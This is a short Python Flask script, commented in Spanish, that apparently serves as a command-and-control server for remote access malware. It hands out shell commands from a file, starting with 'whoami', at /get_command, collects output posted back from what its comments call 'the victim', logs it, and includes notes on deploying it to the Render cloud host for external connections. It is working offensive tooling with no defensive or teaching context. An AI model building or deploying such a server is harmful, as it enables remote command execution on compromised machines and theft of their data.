from flask import Flask, request, jsonify
import os

app = Flask(__name__)

# Usamos la carpeta /tmp para evitar errores de permisos en la nube
COMMAND_FILE = "/tmp/comando.txt"
LOG_FILE = "/tmp/log.txt"

# Crear el archivo de comando inicial si no existe
if not os.path.exists(COMMAND_FILE):
    with open(COMMAND_FILE, "w") as f:
        f.write("whoami")

@app.route('/')
def index():
    return "Servidor Activo - Panel de Control Listo", 200

@app.route('/get_command', methods=['GET'])
def get_command():
    try:
        if os.path.exists(COMMAND_FILE):
            with open(COMMAND_FILE, "r") as f:
                cmd = f.read().strip()
            return cmd if cmd else "nada"
    except Exception as e:
        return f"error: {str(e)}"
    return "nada"

@app.route('/post_result', methods=['POST'])
def post_result():
    try:
        # Recibimos el resultado de la víctima
        result = request.data.decode('utf-8')
        print(f"\n[!] Resultado recibido:\n{result}")
        
        # Guardamos en /tmp para que no bloquee el despliegue
        with open(LOG_FILE, "a") as f:
            f.write(f"\n--- Nuevo Resultado ---\n{result}\n")
        return "OK", 200
    except Exception as e:
        return str(e), 500

if __name__ == "__main__":
    # Render asigna el puerto mediante la variable de entorno PORT
    port = int(os.environ.get("PORT", 10000))
    # host='0.0.0.0' es obligatorio para que Render acepte conexiones externas
    app.run(host='0.0.0.0', port=port)
